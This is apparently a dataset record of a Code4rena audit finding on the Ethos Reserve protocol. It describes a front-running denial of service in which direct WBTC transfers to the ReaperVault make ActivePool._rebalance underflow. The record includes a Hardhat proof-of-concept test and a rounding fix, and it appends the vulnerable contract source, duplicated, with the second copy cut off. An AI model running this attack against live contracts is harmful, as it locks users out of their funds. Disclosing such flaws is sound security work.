{
  "Title": "[M-13] DOS by directly transferring assets to Reaper Vault",
  "Content": "# Lines of code\n\nhttps://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/ActivePool.sol#L251\nhttps://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Core/contracts/ActivePool.sol#L264-L274\nhttps://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultERC4626.sol#L207\nhttps://github.com/code-423n4/2023-02-ethos/blob/main/Ethos-Vault/contracts/ReaperVaultERC4626.sol#L185\n\n\n# Vulnerability details\n\n## Impact\nAttacker can DOS the protocol by directly transferring assets to the ReaperVault. This causes a DOS by underflow in the `ActivePool._rebalance` logic. All core ActivePool functionality will be disabled including all BorrowerOperations functionality and other functionality that relies on ActivePool. This essentially renders the protocol unusable until the protocol team figures out the fix, which is to directly transfer enough assets to ReaperVault to address the underflow. Even then, the attacker can just repeat the attack and make the protocol unusable once again. \n\n## Proof of Concept\nWith the below steps, an attacker can DOS the protocol:\n1. A trove already exists and an initial deposit to the ReaperVault was already done by the ActivePool.\n2. Bob opens a Trove using 190e3 WBTC as collateral (this could be any amount enough to satisfy the minimum borrowing amount of 90 LUSD).\n3. Alice (the Attacker) frontruns Bob's openTrove transaction and transfers WBTC directly to the ReaperVault. The amount of assets transferred will be 1 + amount of assets ActivePool will deposit to the ReaperVault based on yieldingPercentage when Bob's openTrove tx is processed.\n4. Due to Alice's frontrun, the below branch in `ActivePool._rebalance` will trigger during Bob's `openTrove` transaction:\n```solidity\n        } else if (vars.netAssetMovement < 0) {\n            IERC4626(yieldGenerator[_collateral]).withdraw(uint256(-vars.netAssetMovement), address(this), address(this));\n        }\n```\n`vars.netAssetMovement` will be -1 because of Alice's direct transfer of assets amounting to 1 + ActivePool's deposit amount. \n5. Because of Alice's direct transfer of WBTC to ReaperVault, let's say 1 Vault share is now worth 15 units of WBTC. `ReaperVaultERC4626.withdraw` converts assets to shares with some rounding up behavior and then converts those shares to assets again to get the amount withdrawn. This leads to at least 15 units of WBTC being withdrawn even though `vars.netAssetMovement = 1`. \n6. It is this difference between the amount of assets withdrawn from the ReaperVault and the accounting for total yield amount (`yieldingAmount[_collateral]`) that causes an underflow in subsequent calls to `ActivePool._rebalance`. The underflow happens here:\n\n```solidity\n# `vars.sharesToAssets` is now less than `vars.currentAllocated` and this operation will now always revert due to underflow.\n# `vars.sharesToAssets` is total assets in the Vault while `vars.currentAllocated` is `yieldingAmount[_collateral]`. \nvars.profit = vars.sharesToAssets.sub(vars.currentAllocated);\n```\n\nHere is the [git diff](https://gist.githubusercontent.com/gjaldon/460741803d1cb81b7bd76d7240b4ba24/raw/45601e479353f85baa66160104aaca1a54b7a43e/ethos_reserve_dos.patch) for a test POC that shows the attack. To run the POC, do the following:\n\n1. Copy all contents of the gist to `/tmp/changes.patch`\n2. Clone the project repo and cd to the Ethos-Core directory.\n3. Run `git apply /tmp/changes.patch` in the Ethos-Core directory.\n4. Run `npm install` from the command line from Ethos-Core's root directory\n5. Run `npx hardhat test --grep \"DOS attack\"`. The test should pass\n\nThe git diff is huge since it includes copying of Ethos-Vault contracts into the Ethos-Core project so they can be used within the Ethos-Core tests. The test looks like:\n\n```js\n    it(\"DOS attack\", async () => {\n      await activePool.setYieldingPercentage(collaterals[2].address, 1000, {\n        from: owner,\n      });\n      await activePool.setYieldClaimThreshold(collaterals[2].address, 10000, {\n        from: owner,\n      });\n\n      await collaterals[2].mint(alice, dec(10_000, 8));\n      await collaterals[2].approve(borrowerOperations.address, dec(10_000, 8), {\n        from: alice,\n      });\n      await collaterals[2].mint(bob, dec(10_000, 8));\n      await collaterals[2].approve(borrowerOperations.address, dec(10_000, 8), {\n        from: bob,\n      });\n      await collaterals[2].mint(carol, dec(10_000, 8));\n      await collaterals[2].approve(borrowerOperations.address, dec(10_000, 8), {\n        from: carol,\n      });\n      await lusdToken.unprotectedMint(alice, dec(100_000, 18));\n      await lusdToken.unprotectedMint(bob, dec(100_000, 18));\n\n      await priceFeed.setPrice(collaterals[2].address, dec(100_000, 18));\n      const reaperVault = contracts.erc4626vaults[2];\n      await reaperVault.grantRole(\n        await reaperVault.DEPOSITOR(),\n        activePool.address\n      );\n\n      await borrowerOperations.openTrove(\n        collaterals[2].address,\n        dec(190, 3),\n        th._100pct,\n        dec(90, 18),\n        alice,\n        alice,\n        { from: alice }\n      );\n\n      // Alice frontruns Bob's deposit by transfering 300_001 WBTC to ReaperVault. \n      // 300_001 WBTC is 1 unit of WBTC more than the yield that is going to be\n      // deposited to the ReaperVault.\n      await collaterals[2].transfer(reaperVault.address, 300001, {\n        from: alice,\n      });\n\n      await borrowerOperations.openTrove(\n        collaterals[2].address,\n        dec(3, 6),\n        th._100pct,\n        dec(90, 18),\n        bob,\n        bob,\n        { from: bob }\n      );\n\n      // Protocol is now unusable\n      await assertRevert(\n        borrowerOperations.closeTrove(collaterals[2].address, {\n          from: alice,\n        })\n      );\n\n      await assertRevert(\n        borrowerOperations.closeTrove(collaterals[2].address, {\n          from: bob,\n        })\n      );\n\n      await assertRevert(\n        borrowerOperations.openTrove(\n          collaterals[2].address,\n          dec(190, 3),\n          th._100pct,\n          dec(90, 18),\n          carol,\n          carol,\n          { from: carol }\n        )\n      );\n    });\n```\n\n\n## Tools Used\nManual Review, Hardhat/Truffle, VSCode\n\n## Recommended Mitigation Steps\nChanging ReaperVaultERC4626 withdraw to round down instead of up fixes this issue. Below is the fixed code:\n```solidity\n    function previewWithdraw(uint256 assets) public view override returns (uint256 shares) {\n        if (totalSupply() == 0 || _freeFunds() == 0) return 0;\n        shares = (assets * totalSupply()) / _freeFunds();\n    }\n```",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2023-02-ethos-reserve-contest",
  "Code": [
    {
      "filename": "Ethos-Core/contracts/ActivePool.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity 0.6.11;\n\nimport './Interfaces/IActivePool.sol';\nimport \"./Interfaces/ICollateralConfig.sol\";\nimport './Interfaces/IDefaultPool.sol';\nimport \"./Interfaces/ICollSurplusPool.sol\";\nimport \"./Interfaces/ILQTYStaking.sol\";\nimport \"./Interfaces/IStabilityPool.sol\";\nimport \"./Interfaces/ITroveManager.sol\";\nimport \"./Dependencies/SafeMath.sol\";\nimport \"./Dependencies/Ownable.sol\";\nimport \"./Dependencies/CheckContract.sol\";\nimport \"./Dependencies/console.sol\";\nimport \"./Dependencies/SafeERC20.sol\";\nimport \"./Dependencies/IERC4626.sol\";\n\n/*\n * The Active Pool holds the collateral and LUSD debt for each collateral (but not LUSD tokens) for all active troves.\n *\n * When a trove is liquidated, it's collateral and LUSD debt are transferred from the Active Pool, to either the\n * Stability Pool, the Default Pool, or both, depending on the liquidation conditions.\n *\n */\ncontract ActivePool is Ownable, CheckContract, IActivePool {\n    using SafeMath for uint256;\n    using SafeERC20 for IERC20;\n\n    string constant public NAME = \"ActivePool\";\n\n    bool public addressesSet = false;\n    address public collateralConfigAddress;\n    address public borrowerOperationsAddress;\n    address public troveManagerAddress;\n    address public stabilityPoolAddress;\n    address public defaultPoolAddress;\n    address public collSurplusPoolAddress;\n    address public treasuryAddress;\n    address public lqtyStakingAddress;\n    mapping (address => uint256) internal collAmount;  // collateral => amount tracker\n    mapping (address => uint256) internal LUSDDebt;  // collateral => corresponding debt tracker\n\n    mapping (address => uint256) public yieldingPercentage; // collateral => % to use for yield farming (in BPS, <= 10k)\n    mapping (address => uint256) public yieldingAmount; // collateral => actual wei amount being used for yield farming\n    mapping (address => address) public yieldGenerator; // collateral => corresponding ERC4626 vault\n    mapping (address => uint256) public yieldClaimThreshold; // collateral => minimum wei amount of yield to claim and redistribute\n    \n    uint256 public yieldingPercentageDrift = 100; // rebalance iff % is off by more than 100 BPS\n\n    // Yield distribution params, must add up to 10k\n    uint256 public yieldSplitTreasury = 20_00; // amount of yield to direct to treasury in BPS\n    uint256 public yieldSplitSP = 40_00; // amount of yield to direct to stability pool in BPS\n    uint256 public yieldSplitStaking = 40_00; // amount of yield to direct to OATH Stakers in BPS\n\n    // --- Events ---\n\n    event CollateralConfigAddressChanged(address _newCollateralConfigAddress);\n    event BorrowerOperationsAddressChanged(address _newBorrowerOperationsAddress);\n    event TroveManagerAddressChanged(address _newTroveManagerAddress);\n    event CollSurplusPoolAddressChanged(address _collSurplusPoolAddress);\n    event ActivePoolLUSDDebtUpdated(address _collateral, uint _LUSDDebt);\n    event ActivePoolCollateralBalanceUpdated(address _collateral, uint _amount);\n    event YieldingPercentageUpdated(address _collateral, uint256 _bps);\n    event YieldingPercentageDriftUpdated(uint256 _driftBps);\n    event YieldClaimThresholdUpdated(address _collateral, uint256 _threshold);\n    event YieldDistributionParamsUpdated(uint256 _treasurySplit, uint256 _SPSplit, uint256 _stakingSplit);\n\n    // --- Contract setters ---\n\n    function setAddresses(\n        address _collateralConfigAddress,\n        address _borrowerOperationsAddress,\n        address _troveManagerAddress,\n        address _stabilityPoolAddress,\n        address _defaultPoolAddress,\n        address _collSurplusPoolAddress,\n        address _treasuryAddress,\n        address _lqtyStakingAddress,\n        address[] calldata _erc4626vaults\n    )\n        external\n        onlyOwner\n    {\n        require(!addressesSet, \"Can call setAddresses only once\");\n\n        checkContract(_collateralConfigAddress);\n        checkContract(_borrowerOperationsAddress);\n        checkContract(_troveManagerAddress);\n        checkContract(_stabilityPoolAddress);\n        checkContract(_defaultPoolAddress);\n        checkContract(_collSurplusPoolAddress);\n        require(_treasuryAddress != address(0), \"Treasury cannot be 0 address\");\n        checkContract(_lqtyStakingAddress);\n\n        collateralConfigAddress = _collateralConfigAddress;\n        borrowerOperationsAddress = _borrowerOperationsAddress;\n        troveManagerAddress = _troveManagerAddress;\n        stabilityPoolAddress = _stabilityPoolAddress;\n        defaultPoolAddress = _defaultPoolAddress;\n        collSurplusPoolAddress = _collSurplusPoolAddress;\n        treasuryAddress = _treasuryAddress;\n        lqtyStakingAddress = _lqtyStakingAddress;\n\n        address[] memory collaterals = ICollateralConfig(collateralConfigAddress).getAllowedCollaterals();\n        uint256 numCollaterals = collaterals.length;\n        require(numCollaterals == _erc4626vaults.length, \"Vaults array length must match number of collaterals\");\n        for(uint256 i = 0; i < numCollaterals; i++) {\n            address collateral = collaterals[i];\n            address vault = _erc4626vaults[i];\n            require(IERC4626(vault).asset() == collateral, \"Vault asset must be collateral\");\n            yieldGenerator[collateral] = vault;\n        }\n\n        emit CollateralConfigAddressChanged(_collateralConfigAddress);\n        emit BorrowerOperationsAddressChanged(_borrowerOperationsAddress);\n        emit TroveManagerAddressChanged(_troveManagerAddress);\n        emit StabilityPoolAddressChanged(_stabilityPoolAddress);\n        emit DefaultPoolAddressChanged(_defaultPoolAddress);\n        emit CollSurplusPoolAddressChanged(_collSurplusPoolAddress);\n\n        addressesSet = true;\n    }\n\n    function setYieldingPercentage(address _collateral, uint256 _bps) external onlyOwner {\n        _requireValidCollateralAddress(_collateral);\n        require(_bps <= 10_000, \"Invalid BPS value\");\n        yieldingPercentage[_collateral] = _bps;\n        emit YieldingPercentageUpdated(_collateral, _bps);\n    }\n\n    function setYieldingPercentageDrift(uint256 _driftBps) external onlyOwner {\n        require(_driftBps <= 500, \"Exceeds max allowed value of 500 BPS\");\n        yieldingPercentageDrift = _driftBps;\n        emit YieldingPercentageDriftUpdated(_driftBps);\n    }\n\n    function setYieldClaimThreshold(address _collateral, uint256 _threshold) external onlyOwner {\n        _requireValidCollateralAddress(_collateral);\n        yieldClaimThreshold[_collateral] = _threshold;\n        emit YieldClaimThresholdUpdated(_collateral, _threshold);\n    }\n\n    function setYieldDistributionParams(uint256 _treasurySplit, uint256 _SPSplit, uint256 _stakingSplit) external onlyOwner {\n        require(_treasurySplit + _SPSplit + _stakingSplit == 10_000, \"Splits must add up to 10000 BPS\");\n        yieldSplitTreasury = _treasurySplit;\n        yieldSplitSP = _SPSplit;\n        yieldSplitStaking = _stakingSplit;\n        emit YieldDistributionParamsUpdated(_treasurySplit, _SPSplit, _stakingSplit);\n    }\n\n    // --- Getters for public variables. Required by IPool interface ---\n\n    /*\n    * Returns the collAmount state variable.\n    *\n    *Not necessarily equal to the the contract's raw collateral balance - collateral can be forcibly sent to contracts.\n    */\n    function getCollateral(address _collateral) external view override returns (uint) {\n        _requireValidCollateralAddress(_collateral);\n        return collAmount[_collateral];\n    }\n\n    function getLUSDDebt(address _collateral) external view override returns (uint) {\n        _requireValidCollateralAddress(_collateral);\n        return LUSDDebt[_collateral];\n    }\n\n    // --- Pool functionality ---\n\n    function sendCollateral(address _collateral, address _account, uint _amount) external override {\n        _requireValidCollateralAddress(_collateral);\n        _requireCallerIsBOorTroveMorSP();\n        _rebalance(_collateral, _amount);\n        collAmount[_collateral] = collAmount[_collateral].sub(_amount);\n        emit ActivePoolCollateralBalanceUpdated(_collateral, collAmount[_collateral]);\n        emit CollateralSent(_collateral, _account, _amount);\n\n        if (_account == defaultPoolAddress) {\n            IERC20(_collateral).safeIncreaseAllowance(defaultPoolAddress, _amount);\n            IDefaultPool(defaultPoolAddress).pullCollateralFromActivePool(_collateral, _amount);\n        } else if (_account == collSurplusPoolAddress) {\n            IERC20(_collateral).safeIncreaseAllowance(collSurplusPoolAddress, _amount);\n            ICollSurplusPool(collSurplusPoolAddress).pullCollateralFromActivePool(_collateral, _amount);\n        } else {\n            IERC20(_collateral).safeTransfer(_account, _amount);\n        }\n    }\n\n    function increaseLUSDDebt(address _collateral, uint _amount) external override {\n        _requireValidCollateralAddress(_collateral);\n        _requireCallerIsBOorTroveM();\n        LUSDDebt[_collateral] = LUSDDebt[_collateral].add(_amount);\n        ActivePoolLUSDDebtUpdated(_collateral, LUSDDebt[_collateral]);\n    }\n\n    function decreaseLUSDDebt(address _collateral, uint _amount) external override {\n        _requireValidCollateralAddress(_collateral);\n        _requireCallerIsBOorTroveMorSP();\n        LUSDDebt[_collateral] = LUSDDebt[_collateral].sub(_amount);\n        ActivePoolLUSDDebtUpdated(_collateral, LUSDDebt[_collateral]);\n    }\n\n    function pullCollateralFromBorrowerOperationsOrDefaultPool(address _collateral, uint _amount) external override {\n        _requireValidCollateralAddress(_collateral);\n        _requireCallerIsBorrowerOperationsOrDefaultPool();\n        collAmount[_collateral] = collAmount[_collateral].add(_amount);\n        emit ActivePoolCollateralBalanceUpdated(_collateral, collAmount[_collateral]);\n\n        IERC20(_collateral).safeTransferFrom(msg.sender, address(this), _amount);\n        _rebalance(_collateral, 0);\n    }\n\n    function manualRebalance(address _collateral, uint256 _simulatedAmountLeavingPool) external onlyOwner {\n        _requireValidCollateralAddress(_collateral);\n        _rebalance(_collateral, _simulatedAmountLeavingPool);\n    }\n\n    // Due to \"stack too deep\" error\n    struct LocalVariables_rebalance {\n        uint256 currentAllocated;\n        IERC4626 yieldGenerator;\n        uint256 ownedShares;\n        uint256 sharesToAssets;\n        uint256 profit;\n        uint256 finalBalance;\n        uint256 percentOfFinalBal;\n        uint256 yieldingPercentage;\n        uint256 toDeposit;\n        uint256 toWithdraw;\n        uint256 yieldingAmount;\n        uint256 finalYieldingAmount;\n        int256 netAssetMovement;\n        uint256 treasurySplit;\n        uint256 stakingSplit;\n        uint256 stabilityPoolSplit;\n    }\n\n    function _rebalance(address _collateral, uint256 _amountLeavingPool) internal {\n        LocalVariables_rebalance memory vars;\n\n        // how much has been allocated as per our internal records?\n        vars.currentAllocated = yieldingAmount[_collateral];\n        \n        // what is the present value of our shares?\n        vars.yieldGenerator = IERC4626(yieldGenerator[_collateral]);\n        vars.ownedShares = vars.yieldGenerator.balanceOf(address(this));\n        vars.sharesToAssets = vars.yieldGenerator.convertToAssets(vars.ownedShares);\n\n        // if we have profit that's more than the threshold, record it for withdrawal and redistribution\n        vars.profit = vars.sharesToAssets.sub(vars.currentAllocated);\n        if (vars.profit < yieldClaimThreshold[_collateral]) {\n            vars.profit = 0;\n        }\n        \n        // what % of the final pool balance would the current allocation be?\n        vars.finalBalance = collAmount[_collateral].sub(_amountLeavingPool);\n        vars.percentOfFinalBal = vars.finalBalance == 0 ? uint256(-1) : vars.currentAllocated.mul(10_000).div(vars.finalBalance);\n\n        // if abs(percentOfFinalBal - yieldingPercentage) > drift, we will need to deposit more or withdraw some\n        vars.yieldingPercentage = yieldingPercentage[_collateral];\n        vars.finalYieldingAmount = vars.finalBalance.mul(vars.yieldingPercentage).div(10_000);\n        vars.yieldingAmount = yieldingAmount[_collateral];\n        if (vars.percentOfFinalBal > vars.yieldingPercentage && vars.percentOfFinalBal.sub(vars.yieldingPercentage) > yieldingPercentageDrift) {\n            // we will end up overallocated, withdraw some\n            vars.toWithdraw = vars.currentAllocated.sub(vars.finalYieldingAmount);\n            vars.yieldingAmount = vars.yieldingAmount.sub(vars.toWithdraw);\n            yieldingAmount[_collateral] = vars.yieldingAmount;\n        } else if(vars.percentOfFinalBal < vars.yieldingPercentage && vars.yieldingPercentage.sub(vars.percentOfFinalBal) > yieldingPercentageDrift) {\n            // we will end up underallocated, deposit more\n            vars.toDeposit = vars.finalYieldingAmount.sub(vars.currentAllocated);\n            vars.yieldingAmount = vars.yieldingAmount.add(vars.toDeposit);\n            yieldingAmount[_collateral] = vars.yieldingAmount;\n        }\n\n        // + means deposit, - means withdraw\n        vars.netAssetMovement = int256(vars.toDeposit) - int256(vars.toWithdraw) - int256(vars.profit);\n        if (vars.netAssetMovement > 0) {\n            IERC20(_collateral).safeIncreaseAllowance(yieldGenerator[_collateral], uint256(vars.netAssetMovement));\n            IERC4626(yieldGenerator[_collateral]).deposit(uint256(vars.netAssetMovement), address(this));\n        } else if (vars.netAssetMovement < 0) {\n            IERC4626(yieldGenerator[_collateral]).withdraw(uint256(-vars.netAssetMovement), address(this), address(this));\n        }\n\n        // if we recorded profit, recalculate it for precision and distribute\n        if (vars.profit != 0) {\n            // profit is ultimately (coll at hand) + (coll allocated to yield generator) - (recorded total coll Amount in pool)\n            vars.profit = IERC20(_collateral).balanceOf(address(this)).add(vars.yieldingAmount).sub(collAmount[_collateral]);\n            if (vars.profit != 0) {\n                // distribute to treasury, staking pool, and stability pool\n                vars.treasurySplit = vars.profit.mul(yieldSplitTreasury).div(10_000);\n                if (vars.treasurySplit != 0) {\n                    IERC20(_collateral).safeTransfer(treasuryAddress, vars.treasurySplit);\n                }\n\n                vars.stakingSplit = vars.profit.mul(yieldSplitStaking).div(10_000);\n                if (vars.stakingSplit != 0) {\n                    IERC20(_collateral).safeTransfer(lqtyStakingAddress, vars.stakingSplit);\n                    ILQTYStaking(lqtyStakingAddress).increaseF_Collateral(_collateral, vars.stakingSplit);\n                }\n\n                vars.stabilityPoolSplit = vars.profit.sub(vars.treasurySplit.add(vars.stakingSplit));\n                if (vars.stabilityPoolSplit != 0) {\n                    IERC20(_collateral).safeTransfer(stabilityPoolAddress, vars.stabilityPoolSplit);\n                    IStabilityPool(stabilityPoolAddress).updateRewardSum(_collateral, vars.stabilityPoolSplit);   \n                }\n            }\n        }\n    }\n\n    // --- 'require' functions ---\n\n    function _requireValidCollateralAddress(address _collateral) internal view {\n        require(\n            ICollateralConfig(collateralConfigAddress).isCollateralAllowed(_collateral),\n            \"Invalid collateral address\"\n        );\n    }\n\n    function _requireCallerIsBorrowerOperationsOrDefaultPool() internal view {\n        require(\n            msg.sender == borrowerOperationsAddress ||\n            msg.sender == defaultPoolAddress,\n            \"ActivePool: Caller is neither BO nor Default Pool\");\n    }\n\n    function _requireCallerIsBOorTroveMorSP() internal view {\n        address redemptionHelper = address(ITroveManager(troveManagerAddress).redemptionHelper());\n        require(\n            msg.sender == borrowerOperationsAddress ||\n            msg.sender == troveManagerAddress ||\n            msg.sender == redemptionHelper ||\n            msg.sender == stabilityPoolAddress,\n            \"ActivePool: Caller is neither BorrowerOperations nor TroveManager nor StabilityPool\");\n    }\n\n    function _requireCallerIsBOorTroveM() internal view {\n        require(\n            msg.sender == borrowerOperationsAddress ||\n            msg.sender == troveManagerAddress,\n            \"ActivePool: Caller is neither BorrowerOperations nor TroveManager\");\n    }\n}"
    },
    {
      "filename": "Ethos-Core/contracts/ActivePool.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity 0.6.11;\n\nimport './Interfaces/IActivePool.sol';\nimport \"./Interfaces/ICollateralConfig.sol\";\nimport './Interfaces/IDefaultPool.sol';\nimport \"./Interfaces/ICollSurplusPool.sol\";\nimport \"./Interfaces/ILQTYStaking.sol\";\nimport \"./Interfaces/IStabilityPool.sol\";\nimport \"./Interfaces/ITroveManager.sol\";\nimport \"./Dependencies/SafeMath.sol\";\nimport \"./Dependencies/Ownable.sol\";\nimport \"./Dependencies/CheckContract.sol\";\nimport \"./Dependencies/console.sol\";\nimport \"./Dependencies/SafeERC20.sol\";\nimport \"./Dependencies/IERC4626.sol\";\n\n/*\n * The Active Pool holds the collateral and LUSD debt for each collateral (but not LUSD tokens) for all active troves.\n *\n * When a trove is liquidated, it's collateral and LUSD debt are transferred from the Active Pool, to either the\n * Stability Pool, the Default Pool, or both, depending on the liquidation conditions.\n *\n */\ncontract ActivePool is Ownable, CheckContract, IActivePool {\n    using SafeMath for uint256;\n    using SafeERC20 for IERC20;\n\n    string constant public NAME = \"ActivePool\";\n\n    bool public addressesSet = false;\n    address public collateralConfigAddress;\n    address public borrowerOperationsAddress;\n    address public troveManagerAddress;\n    address public stabilityPoolAddress;\n    address public defaultPoolAddress;\n    address public collSurplusPoolAddress;\n    address public treasuryAddress;\n    address public lqtyStakingAddress;\n    mapping (address => uint256) internal collAmount;  // collateral => amount tracker\n    mapping (address => uint256) internal LUSDDebt;  // collateral => corresponding debt tracker\n\n    mapping (address => uint256) public yieldingPercentage; // collateral => % to use for yield farming (in BPS, <= 10k)\n    mapping (address => uint256) public yieldingAmount; // collateral => actual wei amount being used for yield farming\n    mapping (address => address) public yieldGenerator; // collateral => corresponding ERC4626 vault\n    mapping (address => uint256) public yieldClaimThreshold; // collateral => minimum wei amount of yield to claim and redistribute\n    \n    uint256 public yieldingPercentageDrift = 100; // rebalance iff % is off by more than 100 BPS\n\n    // Yield distribution params, must add up to 10k\n    uint256 public yieldSplitTreasury = 20_00; // amount of yield to direct to treasury in BPS\n    uint256 public yieldSplitSP = 40_00; // amount of yield to direct to stability pool in BPS\n    uint256 public yieldSplitStaking = 40_00; // amount of yield to direct to OATH Stakers in BPS\n\n    // --- Events ---\n\n    event CollateralConfigAddressChanged(address _newCollateralConfigAddress);\n    event BorrowerOperationsAddressChanged(address _newBorrowerOperationsAddress);\n    event TroveManagerAddressChanged(address _newTroveManagerAddress);\n    event CollSurplusPoolAddressChanged(address _collSurplusPoolAddress);\n    event ActivePoolLUSDDebtUpdated(address _collateral, uint _LUSDDebt);\n    event ActivePoolCollateralBalanceUpdated(address _collateral, uint _amount);\n    event YieldingPercentageUpdated(address _collateral, uint256 _bps);\n    event YieldingPercentageDriftUpdated(uint256 _driftBps);\n    event YieldClaimThresholdUpdated(address _collateral, uint256 _threshold);\n    event YieldDistributionParamsUpdated(uint256 _treasurySplit, uint256 _SPSplit, uint256 _stakingSplit);\n\n    // --- Contract setters ---\n\n    function setAddresses(\n        address _collateralConfigAddress,\n        address _borrowerOperationsAddress,\n        address _troveManagerAddress,\n        address _stabilityPoolAddress,\n        address _defaultPoolAddress,\n        address _collSurplusPoolAddress,\n        address _treasuryAddress,\n        address _lqtyStakingAddress,\n        address[] calldata _erc4626vaults\n    )\n        external\n        onlyOwner\n    {\n        require(!addressesSet, \"Can call setAddresses only once\");\n\n        checkContract(_collateralConfigAddress);\n        checkContract(_borrowerOperationsAddress);\n        checkContract(_troveManagerAddress);\n        checkContract(_stabilityPoolAddress);\n        checkContract(_defaultPoolAddress);\n        checkContract(_collSurplusPoolAddress);\n        require(_treasuryAddress != address(0), \"Treasury cannot be 0 address\");\n        checkContract(_lqtyStakingAddress);\n\n        collateralConfigAddress = _collateralConfigAddress;\n        borrowerOperationsAddress = _borrowerOperationsAddress;\n        troveManagerAddress = _troveManagerAddress;\n        stabilityPoolAddress = _stabilityPoolAddress;\n        defaultPoolAddress = _defaultPoolAddress;\n        collSurplusPoolAddress = _collSurplusPoolAddress;\n        treasuryAddress = _treasuryAddress;\n        lqtyStakingAddress = _lqtyStakingAddress;\n\n        address[] memory collaterals = ICollateralConfig(collateralConfigAddress).getAllowedCollaterals();\n        uint256 numCollaterals = collaterals.length;\n        require(numCollaterals == _erc4626vaults.length, \"Vaults array length must match number of collaterals\");\n        for(uint256 i = 0; i < numCollaterals; i++) {\n            address collateral = collaterals[i];\n            address vault = _erc4626vaults[i];\n            require(IERC4626(vault).asset() == collateral, \"Vault asset must be collateral\");\n            yieldGenerator[collateral] = vault;\n        }\n\n        emit CollateralConfigAddressChanged(_collateralConfigAddress);\n        emit BorrowerOperationsAddressChanged(_borrowerOperationsAddress);\n        emit TroveManagerAddressChanged(_troveManagerAddress);\n        emit StabilityPoolAddressChanged(_stabilityPoolAddress);\n        emit DefaultPoolAddressChanged(_defaultPoolAddress);\n        emit CollSurplusPoolAddressChanged(_collSurplusPoolAddress);\n\n        addressesSet = true;\n    }\n\n    function setYieldingPercentage(address _collateral, uint256 _bps) external onlyOwner {\n        _requireValidCollateralAddress(_collateral);\n        require(_bps <= 10_000, \"Invalid BPS value\");\n        yieldingPercentage[_collateral] = _bps;\n        emit YieldingPercentageUpdated(_collateral, _bps);\n    }\n\n    function setYieldingPercentageDrift(uint256 _driftBps) external onlyOwner {\n        require(_driftBps <= 500, \"Exceeds max allowed value of 500 BPS\");\n        yieldingPercentageDrift = _driftBps;\n        emit YieldingPercentageDriftUpdated(_driftBps);\n    }\n\n    function setYieldClaimThreshold(address _collateral, uint256 _threshold) external onlyOwner {\n        _requireValidCollateralAddress(_collateral);\n        yieldClaimThreshold[_collateral] = _threshold;\n        emit YieldClaimThresholdUpdated(_collateral, _threshold);\n    }\n\n    function setYieldDistributionParams(uint256 _treasurySplit, uint256 _SPSplit, uint256 _stakingSplit) external onlyOwner {\n        require(_treasurySplit + _SPSplit + _stakingSplit == 10_000, \"Splits must add up to 10000 BPS\");\n        yieldSplitTreasury = _treasurySplit;\n        yieldSplitSP = _SPSplit;\n        yieldSplitStaking = _stakingSplit;\n        emit YieldDistributionParamsUpdated(_treasurySplit, _SPSplit, _stakingSplit);\n    }\n\n    // --- Getters for public variables. Required by IPool interface ---\n\n    /*\n    * Returns the collAmount state variable.\n    *\n    *Not necessarily equal to the the contract's raw collateral balance - collateral can be forcibly sent to contracts.\n    */\n    function getCollateral(address _collateral) external view override returns (uint) {\n        _requireValidCollateralAddress(_collateral);\n        return collAmount[_collateral];\n    }\n\n    function getLUSDDebt(address _collateral) external view override returns (uint) {\n        _requireValidCollateralAddress(_collateral);\n        return LUSDDebt[_collateral];\n    }\n\n    // --- Pool functionality ---\n\n    function sendCollateral(address _collateral, address _account, uint _amount) external override {\n        _requireValidCollateralAddress(_collateral);\n        _requireCallerIsBOorTroveMorSP();\n        _rebalance(_collateral, _amount);\n        collAmount[_collateral] = collAmount[_collateral].sub(_amount);\n        emit ActivePoolCollateralBalanceUpdated(_collateral, collAmount[_collateral]);\n        emit CollateralSent(_collateral, _account, _amount);\n\n        if (_account == defaultPoolAddress) {\n            IERC20(_collateral).safeIncreaseAllowance(defaultPoolAddress, _amount);\n            IDefaultPool(defaultPoolAddress).pullCollateralFromActivePool(_collateral, _amount);\n        } else if (_account == collSurplusPoolAddress) {\n            IERC20(_collateral).safeIncreaseAllowance(collSurplusPoolAddress, _amount);\n            ICollSurplusPool(collSurplusPoolAddress).pullCollateralFromActivePool(_collateral, _amount);\n        } else {\n            IERC20(_collateral).safeTransfer(_account, _amount);\n        }\n    }\n\n    function increaseLUSDDebt(address _collateral, uint _amount) external override {\n        _requireValidCollateralAddress(_collateral);\n        _requireCallerIsBOorTroveM();\n        LUSDDebt[_collateral] = LUSDDebt[_collateral].add(_amount);\n        ActivePoolLUSDDebtUpdated(_collateral, LUSDDebt[_collateral]);\n    }\n\n    function decreaseLUSDDebt(address _collateral, uint _amount) external override {\n        _requireValidCollateralAddress(_collateral);\n        _requireCallerIsBOorTroveMorSP();\n        LUSDDebt[_collateral] = LUSDDebt[_collateral].sub(_amount);\n        ActivePoolLUSDDebtUpdated(_collateral, LUSDDebt[_collateral]);\n    }\n\n    function pullCollateralFromBorrowerOperationsOrDefaultPool(address _collateral, uint _amount) external override {\n        _requireValidCollateralAddress(_collateral);\n        _requireCallerIsBorrowerOperationsOrDefaultPool();\n        collAmount[_collateral] = collAmount[_collateral].add(_amount);\n        emit ActivePoolCollateralBalanceUpdated(_collateral, collAmount[_collateral]);\n\n        IERC20(_collateral).safeTransferFrom(msg.sender, address(this), _amount);\n        _rebalance(_collateral, 0);\n    }\n\n    function manualRebalance(address _collateral, uint256 _simulatedAmountLeavingPool) external onlyOwner {\n        _requireValidCollateralAddress(_collateral);\n        _rebalance(_collateral, _simulatedAmountLeavingPool);\n    }\n\n    // Due to \"stack too deep\" error\n    struct LocalVariables_rebalance {\n        uint256 currentAllocated;\n        IERC4626 yieldGenerator;\n        uint256 ownedShares;\n        uint256 sharesToAssets;\n        uint256 profit;\n        uint256 finalBalance;\n        uint256 percentOfFinalBal;\n        uint256 yieldingPercentage;\n        uint256 toDeposit;\n        uint256 toWithdraw;\n        uint256 yieldingAmount;\n        uint256 finalYieldingAmount;\n        int256 netAssetMovement;\n        uint256 treasurySplit;\n        uint256 stakingSplit;\n        uint256 stabilityPoolSplit;\n    }\n\n    function _rebalance(address _collateral, uint256 _amountLeavingPool) internal {\n        LocalVariables_rebalance memory vars;\n\n        // how much has been allocated as per our internal records?\n        vars.currentAllocated = yieldingAmount[_collateral];\n        \n        // what is the present value of our shares?\n        